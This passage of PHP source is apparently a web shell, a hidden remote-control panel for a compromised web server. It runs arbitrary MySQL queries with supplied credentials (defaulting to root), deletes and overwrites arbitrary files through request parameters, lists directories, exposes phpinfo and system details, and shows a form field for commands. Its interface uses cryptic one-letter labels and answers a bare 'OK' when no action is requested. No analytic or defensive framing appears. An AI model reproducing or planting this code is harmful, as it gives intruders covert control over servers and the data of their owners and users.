...
<?php
 }}elseif(isset($_REQUEST['cc'])){setcookie("uploadDir",$_GET["dir"]);echo "You are OK to upload the file, don't upload files to other directories before completing this upload.";}elseif(isset($_REQUEST['mquery'])){$host=$_REQUEST['host'];$usr=$_REQUEST['usr'];$passwd=$_REQUEST['passwd'];$db=$_REQUEST['db'];$mquery=$_REQUEST['mquery'];@mysql_connect($host,$usr,$passwd) or die("Connection Error: ".mysql_error());mysql_select_db($db);$result=mysql_query($mquery);if($result!=false){echo "<h2>The following query has sucessfully executed</h2>".htmlentities($mquery)."<br /><br />";echo "Return Results:<br />";$first=true;echo "<table border='1'>";while($row=mysql_fetch_array($result,MYSQL_ASSOC)){if($first){echo "<tr>";foreach($row as $key=>$val){echo "<td><b>$key</b></td>";}echo "</tr>";reset($row);$first=false;}echo "<tr>";foreach($row as $val){echo "<td>$val</td>";}echo "</tr>";}echo "</table>";mysql_free_result($result);}else {echo "Query Error: ".mysql_error();}}elseif(isset($_REQUEST['df'])){$_REQUEST['df'].=$slash.$_REQUEST['file'];if(@unlink($_REQUEST['df'])){echo "File deleted";}else {echo "Error deleting file";}}elseif(isset($_REQUEST['ef'])){?>
<script type="text/javascript">
  <!--
  function encode64(e){e=escape(e);var a,r,c,t,h,A="",o="",d="",k=0;do a=e.charCodeAt(k++),r=e.charCodeAt(k++),o=e.charCodeAt(k++),c=a>>2,t=(3&a)<<4|r>>4,h=(15&r)<<2|o>>6,d=63&o,isNaN(r)?h=d=64:isNaN(o)&&(d=64),A=A+key.charAt(c)+key.charAt(t)+key.charAt(h)+key.charAt(d),a=r=o=c=t=h=d="";while(k<e.length);return A}var key="69Xwt5fKb2H7XlROhWr5R769Xwt5fKb2H7XlROhWr5R73fXVcU8oRr3fXVcU8oRr69Xwt5fKb2H7XlROhWr5R73fXVcU8oRr";
  //-->
</script>
<?php
 $_REQUEST['ef'].=$_REQUEST['file'];if(isset($_POST["newcontent"])){$_POST["newcontent"]=urldecode(base64_decode($_POST["newcontent"]));$stream=@fopen($_REQUEST['ef'],"w");if($stream){fwrite($stream,$_POST["newcontent"]);echo "Write sucessful";}else {echo "Could not write to file";}fclose($stream);}?>
...
<i>
<?php echo PHP_OS;?><br />
<?php echo PHP_VERSION;?>&nbsp;&nbsp;&nbsp;<a href="?phpinfo=true">phpinfo()</a>
</i>
<br />
<br />
<b></b><br />
<a href="?d=<?php echo getcwd();?>"><b>C</b></a><br />
<a href="?d=<?php echo $rootDir;?>"><b>R</b></a><br />
<b>A:</b><form action="" method="GET"><input type="text" name="d" value="<?php echo $rootDir;?>" /><input type="submit" value="Go" /></form>

<hr>:
<form action="" METHOD="GET">
<table>
<tr><td>h</td><td><input type="text" name="host"value="localhost"></td></tr>
<tr><td>u</td><td><input type="text" name="usr" value="root"></td></tr>
<tr><td>p</td><td><input type="text" name="passwd"></td></tr>
<tr><td>d</td><td><input type="text" name="db"></td></tr>
<tr><td valign="top">q</td><td><textarea name="mquery" rows="6" cols="65"></textarea></td></tr>
<tr><td colspan="2"><input type="submit" value="Execute"></td></tr>
</table>
</form>
<hr>
<pre><form action="" METHOD="GET">Es <?php echo (@ini_get('safe_mode')?'on':'off');?>): <input type="text" name="c"><input type="submit" value="Go"></form></pre>
<?php
}else{echo "OK";}}